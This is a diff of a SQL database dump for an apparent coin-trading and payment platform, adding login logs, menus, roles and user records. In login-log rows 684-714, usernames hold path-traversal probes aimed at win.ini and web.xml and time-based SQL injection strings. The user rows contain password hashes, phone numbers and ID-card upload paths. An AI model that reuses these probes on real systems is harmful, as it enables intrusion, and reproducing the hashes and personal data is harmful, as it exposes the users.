+INSERT INTO `sys_logininfor` VALUES (684, 'test', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (685, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (686, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (687, '../../../../../../Windows/win.ini', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (688, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (689, './../../../../../../Windows/win.ini', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (690, 'root', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (691, '../../../../../../Windows/win.ini\0admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (692, 'test', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (693, 'admin\'and(select+1)>0waitfor/**/delay\'0:0:0', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (694, 'WEB-INF/web.xml', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (695, 'admin\'and(select+1)>0waitfor/**/delay\'0:0:2', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (696, 'WEB-INF/web.xml;admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (697, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (698, '../WEB-INF/web.xml', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (699, 'root', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (700, '../WEB-INF/web.xml;admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (701, 'test', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (702, '../../WEB-INF/web.xml', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (703, '../../WEB-INF/web.xml;admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (704, '../../../WEB-INF/web.xml', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (705, '../../../WEB-INF/web.xml;admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (706, '../../../../WEB-INF/web.xml', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (707, '../../../../WEB-INF/web.xml;admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (708, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (709, 'root', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (710, 'test', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (711, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (712, 'tdThznyP', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (713, 'admin', '45.251.111.165', 'XX XX', 'Firefox 7', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2024-05-24 22:25:56');
+INSERT INTO `sys_logininfor` VALUES (714, 'admin', '45.251.111.165', 'XX XX', 'Mozilla', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2024-05-24 22:26:25');
+INSERT INTO `sys_logininfor` VALUES (715, 'admin', '127.0.0.1', '内网IP', 'Chrome 12', 'Mac OS X', '0', '登录成功', '2024-05-25 13:48:59');
+INSERT INTO `sys_logininfor` VALUES (716, 'admin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 13:53:03');
+INSERT INTO `sys_logininfor` VALUES (717, 'admin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-25 13:53:08');
+INSERT INTO `sys_logininfor` VALUES (718, 'admin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '0', '退出成功', '2024-05-25 14:04:53');
+INSERT INTO `sys_logininfor` VALUES (719, 'okadmin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 14:05:02');
+INSERT INTO `sys_logininfor` VALUES (720, 'okadmin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 14:05:12');
+INSERT INTO `sys_logininfor` VALUES (721, 'okadmin', '103.172.41.197', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 14:05:17');
+INSERT INTO `sys_logininfor` VALUES (722, 'agent1', '36.249.156.79', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-25 16:35:53');
+INSERT INTO `sys_logininfor` VALUES (723, 'admin', '185.220.100.244', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 19:26:18');
+INSERT INTO `sys_logininfor` VALUES (724, 'admin', '185.220.100.244', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 19:26:33');
+INSERT INTO `sys_logininfor` VALUES (725, 'admin', '185.220.100.244', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 19:26:38');
+INSERT INTO `sys_logininfor` VALUES (726, 'admin', '185.220.100.244', 'XX XX', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-25 19:26:41');
+INSERT INTO `sys_logininfor` VALUES (727, 'admin', '185.220.100.244', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-25 19:26:45');
+INSERT INTO `sys_logininfor` VALUES (728, 'admin', '127.0.0.1', '内网IP', 'Chrome 12', 'Mac OS X', '0', '登录成功', '2024-05-25 20:41:00');
+INSERT INTO `sys_logininfor` VALUES (729, 'admin', '123.174.44.38', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-05-27 13:43:07');
+INSERT INTO `sys_logininfor` VALUES (730, 'okadmin', '123.174.44.38', 'XX XX', 'Chrome 49', 'Windows 7', '0', '登录成功', '2024-05-27 13:46:02');
+INSERT INTO `sys_logininfor` VALUES (731, 'kehu2', '182.239.93.202', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-28 19:49:07');
+INSERT INTO `sys_logininfor` VALUES (732, 'kehu1', '182.239.93.202', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-28 19:49:15');
+INSERT INTO `sys_logininfor` VALUES (733, 'admin', '103.142.131.250', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-05-29 16:09:31');
+INSERT INTO `sys_logininfor` VALUES (734, 'admin', '103.142.131.150', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-05-30 11:47:06');
+INSERT INTO `sys_logininfor` VALUES (735, 'admin', '103.142.131.150', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-05-31 16:31:42');
+INSERT INTO `sys_logininfor` VALUES (736, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-31 20:53:07');
+INSERT INTO `sys_logininfor` VALUES (737, 'okasmin', '182.239.115.45', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-06-01 16:46:37');
+INSERT INTO `sys_logininfor` VALUES (738, 'okasmin', '182.239.115.45', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-06-01 16:46:41');
+INSERT INTO `sys_logininfor` VALUES (739, 'okadmin', '182.239.115.45', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-01 16:47:03');
+INSERT INTO `sys_logininfor` VALUES (740, 'kehu1', '182.239.92.114', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-06-01 16:49:04');
+INSERT INTO `sys_logininfor` VALUES (741, 'merchant1', '182.239.115.45', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-01 16:50:00');
+INSERT INTO `sys_logininfor` VALUES (742, 'kehu1', '182.239.92.114', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '退出成功', '2024-06-01 17:00:18');
+INSERT INTO `sys_logininfor` VALUES (743, 'aa823126', '182.239.92.114', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-06-01 17:00:50');
+INSERT INTO `sys_logininfor` VALUES (744, 'okadmin', '223.104.55.5', 'XX XX', 'Chrome 10', 'Windows 10', '0', '登录成功', '2024-06-01 17:14:49');
+INSERT INTO `sys_logininfor` VALUES (745, 'admin', '205.189.160.70', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-06-02 13:30:25');
+INSERT INTO `sys_logininfor` VALUES (746, 'admin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-06-02 17:34:01');
+INSERT INTO `sys_logininfor` VALUES (747, 'admin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '退出成功', '2024-06-02 17:35:01');
+INSERT INTO `sys_logininfor` VALUES (748, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-06-02 17:35:04');
+INSERT INTO `sys_logininfor` VALUES (749, 'admin', '123.174.44.38', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-06-02 17:55:17');
+INSERT INTO `sys_logininfor` VALUES (750, 'zx123', '182.239.114.152', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-06-02 21:29:13');
+INSERT INTO `sys_logininfor` VALUES (751, 'zx147258', '182.239.114.152', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-06-02 21:29:32');
+INSERT INTO `sys_logininfor` VALUES (752, 'aa823126', '182.239.115.45', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-02 22:32:07');
+INSERT INTO `sys_logininfor` VALUES (753, 'admin', '127.0.0.1', '内网IP', 'Chrome 12', 'Mac OS X', '0', '登录成功', '2024-06-04 15:54:53');
+INSERT INTO `sys_logininfor` VALUES (754, 'merchant1', '182.239.93.139', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2024-06-04 21:06:47');
+INSERT INTO `sys_logininfor` VALUES (755, 'admin', '103.142.131.116', 'XX XX', 'Chrome 9', 'Android 1.x', '0', '登录成功', '2024-06-05 11:59:58');
+INSERT INTO `sys_logininfor` VALUES (756, 'aa823126', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-06-05 19:15:35');
+INSERT INTO `sys_logininfor` VALUES (757, 'aa823126', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-05 19:15:46');
+INSERT INTO `sys_logininfor` VALUES (758, 'okadmin', '182.239.92.89', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-05 19:17:36');
+INSERT INTO `sys_logininfor` VALUES (759, 'aa823126', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-06-05 19:18:26');
+INSERT INTO `sys_logininfor` VALUES (760, 'kehu1', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-05 19:18:51');
+INSERT INTO `sys_logininfor` VALUES (761, 'kehu1', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-06-05 19:22:06');
+INSERT INTO `sys_logininfor` VALUES (762, 'agent1', '182.239.92.89', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-05 19:22:31');
+INSERT INTO `sys_logininfor` VALUES (763, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-06-05 19:25:39');
+INSERT INTO `sys_logininfor` VALUES (764, 'okadmin', '182.239.92.89', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-06-05 19:27:59');
+INSERT INTO `sys_logininfor` VALUES (765, 'agent1', '127.0.0.1', '内网IP', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-06-06 01:59:25');
+INSERT INTO `sys_logininfor` VALUES (766, 'okadmin', '182.239.92.42', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2024-06-06 01:59:45');
 
 -- ----------------------------
 -- Table structure for sys_menu
@@ -1006,7 +1374,7 @@ CREATE TABLE `sys_menu`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '备注',
   PRIMARY KEY (`menu_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 1071 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '菜单权限表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 1072 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '菜单权限表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_menu
@@ -1106,6 +1474,7 @@ INSERT INTO `sys_menu` VALUES (1067, '交易记录查询', 1066, 1, '#', '', NUL
 INSERT INTO `sys_menu` VALUES (1068, '支付审核', 1, 10, 'payApprove', 'system/payApprove/index', NULL, 1, 0, 'C', '0', '0', 'system:payApprove:list', 'money', 'admin', '2024-02-29 11:33:46', 'admin', '2024-02-29 11:40:35', '用户支付方式审核菜单');
 INSERT INTO `sys_menu` VALUES (1069, '支付审核查询', 1068, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'system:payApprove:query', '#', 'admin', '2024-02-29 11:34:15', '', NULL, '');
 INSERT INTO `sys_menu` VALUES (1070, '异议单审核', 1063, 4, 'objectionApprove', 'system/buyCoin/objectionApprove', NULL, 1, 0, 'C', '0', '0', 'system:buyCoin:list', 'list', 'admin', '2024-01-23 08:05:33', 'admin', '2024-03-13 19:18:31', '交易市场');
+INSERT INTO `sys_menu` VALUES (1071, '转账流水记录', 1063, 5, 'rechargeTransactionSearch', 'system/transactionRecord/rechargeTransactionSearch', NULL, 1, 0, 'C', '0', '0', NULL, 'build', 'admin', '2024-06-02 17:34:36', '', NULL, '');
 
 -- ----------------------------
 -- Table structure for sys_notice
@@ -1145,7 +1514,11 @@ CREATE TABLE `sys_notice_user`  (
 -- ----------------------------
 -- Records of sys_notice_user
 -- ----------------------------
+INSERT INTO `sys_notice_user` VALUES (1, 11);
+INSERT INTO `sys_notice_user` VALUES (2, 11);
 INSERT INTO `sys_notice_user` VALUES (3, 1);
+INSERT INTO `sys_notice_user` VALUES (3, 10);
+INSERT INTO `sys_notice_user` VALUES (3, 11);
 
 -- ----------------------------
 -- Table structure for sys_oper_log
@@ -1173,7 +1546,7 @@ CREATE TABLE `sys_oper_log`  (
   INDEX `idx_sys_oper_log_bt`(`business_type`) USING BTREE,
   INDEX `idx_sys_oper_log_s`(`status`) USING BTREE,
   INDEX `idx_sys_oper_log_ot`(`oper_time`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 345 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '操作日志记录' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '操作日志记录' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_oper_log
@@ -1257,8 +1630,8 @@ CREATE TABLE `sys_role`  (
 -- Records of sys_role
 -- ----------------------------
 INSERT INTO `sys_role` VALUES (1, '超级管理员', 'admin', 1, '1', 1, 1, '0', '0', 'admin', '2024-01-02 21:22:09', '', NULL, '超级管理员');
-INSERT INTO `sys_role` VALUES (2, 'OK平台管理员', 'okpayadmin', 2, '4', 1, 1, '0', '0', 'admin', '2024-01-02 21:22:09', 'admin', '2024-03-13 19:19:08', 'OK平台管理员');
-INSERT INTO `sys_role` VALUES (3, '商户', 'merchant', 3, '4', 1, 1, '0', '0', 'admin', '2024-01-02 22:53:21', 'admin', '2024-03-13 19:19:13', NULL);
+INSERT INTO `sys_role` VALUES (2, 'OK平台管理员', 'okpayadmin', 2, '4', 1, 1, '0', '0', 'admin', '2024-01-02 21:22:09', 'admin', '2024-06-02 17:34:45', 'OK平台管理员');
+INSERT INTO `sys_role` VALUES (3, '商户', 'merchant', 3, '4', 1, 1, '0', '0', 'admin', '2024-01-02 22:53:21', 'admin', '2024-06-02 17:34:49', NULL);
 INSERT INTO `sys_role` VALUES (4, '代理', 'agent', 4, '1', 1, 1, '0', '0', 'admin', '2024-01-02 22:53:36', '', '2024-01-04 22:45:05', NULL);
 INSERT INTO `sys_role` VALUES (5, '客户', 'customer', 5, '1', 1, 1, '0', '0', 'admin', '2024-01-04 22:44:34', '', '2024-01-04 22:44:59', NULL);
 
@@ -1318,6 +1691,7 @@ INSERT INTO `sys_role_menu` VALUES (2, 1067);
 INSERT INTO `sys_role_menu` VALUES (2, 1068);
 INSERT INTO `sys_role_menu` VALUES (2, 1069);
 INSERT INTO `sys_role_menu` VALUES (2, 1070);
+INSERT INTO `sys_role_menu` VALUES (2, 1071);
 INSERT INTO `sys_role_menu` VALUES (3, 1);
 INSERT INTO `sys_role_menu` VALUES (3, 100);
 INSERT INTO `sys_role_menu` VALUES (3, 1000);
@@ -1337,6 +1711,7 @@ INSERT INTO `sys_role_menu` VALUES (3, 1067);
 INSERT INTO `sys_role_menu` VALUES (3, 1068);
 INSERT INTO `sys_role_menu` VALUES (3, 1069);
 INSERT INTO `sys_role_menu` VALUES (3, 1070);
+INSERT INTO `sys_role_menu` VALUES (3, 1071);
 
 -- ----------------------------
 -- Table structure for sys_sale_coin
@@ -1364,7 +1739,7 @@ CREATE TABLE `sys_sale_coin`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
   PRIMARY KEY (`sale_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '卖币表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '卖币表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_sale_coin
@@ -1391,7 +1766,7 @@ CREATE TABLE `sys_transaction_record`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
   PRIMARY KEY (`record_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '交易记录表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '交易记录表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_transaction_record
@@ -1447,16 +1822,16 @@ CREATE TABLE `sys_user`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
   PRIMARY KEY (`user_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 20 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户信息表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 28 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户信息表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_user
 -- ----------------------------
-INSERT INTO `sys_user` VALUES (1, NULL, 'admin', '若依', '00', 'ry@163.com', '15888888888', '1', NULL, '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2', NULL, NULL, '351', NULL, NULL, NULL, NULL, 0.00, 0.00, 'a12c', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0, '0', 0, 0, 0, '0', '0', '182.239.93.139', '2024-05-21 23:16:11', 'admin', '2024-01-02 21:22:09', '', '2024-05-21 23:16:11', '管理员');
-INSERT INTO `sys_user` VALUES (2, 100, 'okadmin', 'OK平台管理员', '01', 'r1@qq.com', '15666666666', '0', NULL, '$2a$10$drG84FUnSUmIpfYgmGu4SO4JRAofckH0Tu8jrLk6iUB7us3QCTmNO', NULL, '冷笑话', '350', '/profile/upload/2024/01/02/身份证正面_20240102234517A001.png', '/profile/upload/2024/01/02/身份证反面_20240102235056A002.png', NULL, NULL, 0.00, 0.00, '789c', NULL, '/profile/upload/2024/01/02/二维码1_20240102235100A003.PNG', NULL, '/profile/upload/2024/01/02/二维码2_20240102235103A004.PNG', NULL, '1231', '123', 0, 0, 0, 0, '0', 0, 0, 0, '0', '0', '182.239.93.139', '2024-05-21 23:28:49', 'admin', '2024-01-02 21:22:09', 'admin', '2024-05-21 23:28:48', '测试员');
-INSERT INTO `sys_user` VALUES (7, 216, 'merchant1', '测试商户1', '02', '', '', '0', NULL, '$2a$10$J7QlQrGx.MKJA4RCPosV1OMeb6Q5BRlUBtrnJcpZsuj4teFYdWEWa', NULL, NULL, NULL, NULL, NULL, NULL, 'bda658a8deaeb84f', 534.90, 0.00, '506309', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 0, 0, '0', 15, 0, 2000, '0', '0', '127.0.0.1', '2024-03-31 23:39:55', 'admin', '2024-01-04 23:20:30', 'okadmin', '2024-05-21 23:29:10', NULL);
-INSERT INTO `sys_user` VALUES (10, 217, 'agent1', '代理用户1', '03', '', '15888888880', '0', NULL, '$2a$10$hi2MYI5ZidJodEHmTa9l..TiqudvlxJgb9DE1W02EwMcfwNgLcQeO', '$2a$10$xlssbvg5snLtsU5IH1bOa.katjFBryMYf20QkN1t95Aq0sJ61x4Ea', '李敖', '465798', '/profile/upload/2024/01/06/image_20240106002359A001.jpeg', '/profile/upload/2024/01/06/image_20240106002359A002.jpeg', NULL, 'f81b23c69b951622', 2300.00, 0.00, '834d02', '微信支付补充信息', '/profile/upload/2024/03/09/image_20240309010839A006.jpeg', '333', '/profile/upload/2024/03/09/image_20240309010443A004.jpeg', NULL, NULL, NULL, 7, 0, 0, 10, '0', 0, 0, 0, '0', '0', '127.0.0.1', '2024-03-31 21:06:51', '', '2024-01-06 00:23:59', 'okadmin', '2024-05-21 23:29:14', NULL);
-INSERT INTO `sys_user` VALUES (11, 218, 'kehu1', '测试客户new1', '04', '', '15888888881', '0', NULL, '$2a$10$GVeRZAsgG/k7lDceqVZCGejCfKRFTaUtnuCJbuVPB3Z973ZW5DTCC', '$2a$10$no4ZDhvNT7prNN8PF3w3reRdww7S.sdm1PA3/B0ak8bVZd2UKn7pW', '客', '12312312', '/profile/upload/2024/01/13/image_20240113231017A001.jpeg', '/profile/upload/2024/01/13/image_20240113231017A002.jpeg', NULL, '640a5d739e2e3fd0', 7468.40, 0.00, '0e9ace', '微信支付补充信息', '/profile/upload/2024/01/21/image_20240121165650A001.jpeg', NULL, NULL, NULL, NULL, NULL, 10, 0, 0, 0, '0', 0, 0, 0, '0', '0', '127.0.0.1', '2024-03-31 21:07:23', '', '2024-01-13 23:10:17', 'okadmin', '2024-05-21 23:29:18', 'hello');
+INSERT INTO `sys_user` VALUES (1, NULL, 'admin', '若依', '00', 'ry@163.com', '15888888888', '1', NULL, '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2', NULL, NULL, '351', NULL, NULL, NULL, NULL, 0.00, 0.00, 'a12c', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0, '0', 0, 0, 0, '0', '0', '103.142.131.116', '2024-06-05 11:59:59', 'admin', '2024-01-02 21:22:09', '', '2024-06-05 11:59:58', '管理员');
+INSERT INTO `sys_user` VALUES (2, 100, 'okadmin', 'OK平台管理员', '01', 'r1@qq.com', '15666666666', '0', NULL, '$2a$10$drG84FUnSUmIpfYgmGu4SO4JRAofckH0Tu8jrLk6iUB7us3QCTmNO', NULL, '冷笑话', '350', '/profile/upload/2024/01/02/身份证正面_20240102234517A001.png', '/profile/upload/2024/01/02/身份证反面_20240102235056A002.png', NULL, NULL, 0.00, 0.00, '789c', NULL, '/profile/upload/2024/01/02/二维码1_20240102235100A003.PNG', NULL, '/profile/upload/2024/01/02/二维码2_20240102235103A004.PNG', NULL, '1231', '123', 0, 0, 0, 0, '0', 0, 0, 0, '0', '0', '182.239.92.42', '2024-06-06 01:59:46', 'admin', '2024-01-02 21:22:09', 'admin', '2024-06-06 01:59:45', '测试员');
+INSERT INTO `sys_user` VALUES (7, 216, 'merchant1', '测试商户1', '02', '', '', '0', NULL, '$2a$10$J7QlQrGx.MKJA4RCPosV1OMeb6Q5BRlUBtrnJcpZsuj4teFYdWEWa', '$2a$10$oNxgc1ZoAnaS8K8iIsWDwOJF/RNVYVueAIIyiPQJnSPb6EWSky0.G', NULL, NULL, NULL, NULL, NULL, 'bda658a8deaeb84f', 814.90, 0.00, '506309', NULL, '/profile/upload/2024/05/23/image_20240523153945A006.jpeg', NULL, NULL, NULL, NULL, NULL, 2, 0, 0, 0, '0', 15, 0, 2000, '0', '0', '182.239.93.139', '2024-06-04 21:06:48', 'admin', '2024-01-04 23:20:30', 'okadmin', '2024-06-05 19:34:48', NULL);
